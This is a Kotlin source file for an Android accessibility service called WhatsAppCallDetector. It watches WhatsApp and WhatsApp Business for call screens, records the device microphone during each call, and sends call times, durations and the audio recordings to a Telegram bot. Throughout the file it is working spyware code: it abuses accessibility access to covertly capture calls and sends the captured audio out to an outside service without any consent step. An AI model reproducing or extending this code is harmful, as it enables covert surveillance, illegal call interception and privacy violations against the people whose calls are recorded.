package com.dec.monitor.call

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class WhatsAppCallDetector : AccessibilityService() {

    private var waCallActive = false
    private var waCallStart = 0L
    private var recorder: MediaRecorder? = null
    private var recordingFile: File? = null

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            packageNames = arrayOf("com.whatsapp", "com.whatsapp.w4b")
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return

        val className = event.className?.toString() ?: ""
        val text = event.text.joinToString(" ").lowercase(Locale.getDefault())

        val isCallScreen = className.contains("call", ignoreCase = true) ||
                text.contains("calling") || text.contains("ringing") ||
                text.contains("ongoing") || text.contains("voice call") ||
                text.contains("video call") || text.contains("audio call") ||
                text.contains("in call") || text.contains("connected")

        if (isCallScreen && !waCallActive) {
            waCallActive = true
            waCallStart = System.currentTimeMillis()
            val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("💬 <b>WhatsApp Call Started</b>\nTime: $time")
            }
            startMicRecording()

        } else if (!isCallScreen && waCallActive) {
            waCallActive = false
            val duration = ((System.currentTimeMillis() - waCallStart) / 1000).toString() + "s"
            val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("🔴 <b>WhatsApp Call Ended</b>\nDuration: $duration\nTime: $time")
            }
            stopMicRecording()
        }
    }

    private fun startMicRecording() {
        try {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            recordingFile = File(getExternalFilesDir(null), "wa_call_$timestamp.mp3")

            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(192000)
                setOutputFile(recordingFile?.absolutePath)
                prepare()
                start()
                Log.d("WACallDetector", "MIC recording started")
            }
        } catch (e: Exception) {
            Log.e("WACallDetector", "Recording failed: ${e.message}")
            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("⚠️ WA call mic recording failed: ${e.message}")
            }
        }
    }

    private fun stopMicRecording() {
        try {
            recorder?.stop()
            recorder?.release()
        } catch (e: Exception) {
            Log.e("WACallDetector", "Stop error: ${e.message}")
        }
        recorder = null

        recordingFile?.let { file ->
            if (file.exists() && file.length() > 1024) {
                CoroutineScope(Dispatchers.IO).launch {
                    TelegramBot.sendAudio(file, "🎙 WhatsApp call recording")
                }
            } else {
                CoroutineScope(Dispatchers.IO).launch {
                    TelegramBot.sendMessage("⚠️ WA call recording empty")
                }
            }
        }
        recordingFile = null
    }

    override fun onInterrupt() {
        stopMicRecording()
    }

    override fun onDestroy() {
        stopMicRecording()
        super.onDestroy()
    }
}
